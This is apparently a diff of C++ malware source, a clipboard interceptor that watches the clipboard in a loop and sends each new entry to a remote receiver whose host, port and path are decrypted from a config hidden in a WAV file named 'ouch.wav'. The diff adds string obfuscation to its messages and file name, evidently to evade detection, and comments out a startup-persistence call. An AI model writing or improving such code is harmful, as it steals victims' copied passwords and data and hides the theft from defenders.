@@ -7,15 +7,12 @@
 #include <tools.h>
 #include <httpexfil.h>
 #include <wavcrypt.h>
-
-// Console ouput UTF_16 format, TODO REMOVE
-#include <fcntl.h>
-#include <io.h>
+#include <obfstr.h>
 
 void HandleNewData(std::string& data)
 {    
-    std::cout << "[*] New Clipboard Content:\n\n" << data << "\n\n";
-    std::cout << "Sending data to receiver...\n";
+    std::cout << OBFSTR("[*] New Clipboard Content:\n\n") << data << "\n\n";
+    std::cout << OBFSTR("Sending data to receiver...\n");
 
     try
     {
@@ -23,21 +20,21 @@ void HandleNewData(std::string& data)
     }
     catch(const std::exception& ex)
     {
-        std::wcout << "Error when sending data to receiver: " << ex.what() << "\n";
+        std::wcout << OBFSTR("Error when sending data to receiver: ") << ex.what() << "\n";
     }
     catch(...)
     {
-        std::wcout << "Unknown exception occured when sending data to receiver.\n";
+        std::wcout << OBFSTR("Unknown exception occured when sending data to receiver.\n");
     }
 }
 
 int main() {
-    AddToStartup();
+    // AddToStartup();
 
-    std::cout << "[*] Clipboard Interceptor Started\n";
+    std::cout << OBFSTR("[*] Clipboard Interceptor Started\n");
     std::string lastClipboard = "";
 
-    auto [host, port, path] = ExtractAndDecryptConfig("ouch.wav");
+    auto [host, port, path] = ExtractAndDecryptConfig(OBFSTR("ouch.wav"));
 
     while(true)
     {
